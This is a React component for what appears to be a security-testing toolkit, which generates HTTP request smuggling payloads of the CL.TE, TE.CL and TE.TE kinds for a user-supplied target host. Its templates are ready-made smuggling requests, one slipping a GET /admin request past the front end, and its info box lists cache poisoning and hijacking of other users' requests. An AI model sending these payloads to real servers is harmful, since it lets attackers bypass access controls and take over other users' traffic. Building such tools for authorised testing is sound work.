import { useState } from 'react';
import ToolWrapper from './ToolWrapper';
import { HttpIcon } from '../common/Icons';
import styles from './SharedTool.module.css';

type SmuggleType = 'CL.TE' | 'TE.CL' | 'TE.TE';

export default function HTTPSmuggling() {
  const [targetHost, setTargetHost] = useState('');
  const [smuggleType, setSmuggleType] = useState<SmuggleType>('CL.TE');
  const [output, setOutput] = useState('');
  const [error, setError] = useState('');

  const payloads: Record<SmuggleType, string> = {
    'CL.TE': `POST / HTTP/1.1
Host: ${targetHost || 'target.com'}
Content-Length: 6
Transfer-Encoding: chunked

0

G`,
    'TE.CL': `POST / HTTP/1.1
Host: ${targetHost || 'target.com'}
Content-Length: 4
Transfer-Encoding: chunked

12
SMUGGLED_REQUEST
0

`,
    'TE.TE': `POST / HTTP/1.1
Host: ${targetHost || 'target.com'}
Transfer-Encoding: chunked
Transfer-Encoding: identity

5e
GET /admin HTTP/1.1
Host: target.com

0

`,
  };

  const generate = () => {
    setError('');
    setOutput(payloads[smuggleType]);
  };

  return (
    <ToolWrapper
      title="HTTP Smuggling"
      icon={<HttpIcon />}
      description="Test for HTTP request smuggling vulnerabilities"
    >
      <div className={styles.section}>
        <div className={styles.inputGroup}>
          <label className={styles.label}>Target Host</label>
          <input
            type="text"
            className={styles.input}
            value={targetHost}
            onChange={(e) => setTargetHost(e.target.value)}
            placeholder="target.com"
          />
        </div>
        <div className={styles.inputGroup}>
          <label className={styles.label}>Smuggling Type</label>
          <select
            className={styles.select}
            value={smuggleType}
            onChange={(e) => setSmuggleType(e.target.value as SmuggleType)}
          >
            <option value="CL.TE">CL.TE (Front-end: CL, Back-end: TE)</option>
            <option value="TE.CL">TE.CL (Front-end: TE, Back-end: CL)</option>
            <option value="TE.TE">TE.TE (Transfer-Encoding obfuscation)</option>
          </select>
        </div>
        <div className={styles.buttonGroup}>
          <button className={styles.primaryBtn} onClick={generate}>
            Generate Payload
          </button>
          <button
            className={styles.secondaryBtn}
            onClick={() => {
              setTargetHost('');
              setOutput('');
              setError('');
            }}
          >
            Clear
          </button>
        </div>
      </div>

      {error && <div className={styles.errorBox}>{error}</div>}

      {output && (
        <div className={styles.resultBox}>
          <div className={styles.resultHeader}>
            <span className={styles.resultTitle}>Smuggling Payload</span>
            <button
              className={styles.copyBtn}
              onClick={() => navigator.clipboard.writeText(output)}
            >
              Copy
            </button>
          </div>
          <pre className={styles.codeBlock}>{output}</pre>
        </div>
      )}

      <div className={styles.infoBox}>
        <h3>HTTP Smuggling Types</h3>
        <ul>
          <li>
            <strong>CL.TE:</strong> Front-end uses Content-Length, back-end uses Transfer-Encoding
          </li>
          <li>
            <strong>TE.CL:</strong> Front-end uses Transfer-Encoding, back-end uses Content-Length
          </li>
          <li>
            <strong>TE.TE:</strong> Both use TE but can be obfuscated
          </li>
        </ul>
        <h3>Impact</h3>
        <ul>
          <li>Bypass security controls</li>
          <li>Poison web cache</li>
          <li>Hijack other users' requests</li>
        </ul>
      </div>
    </ToolWrapper>
  );
}
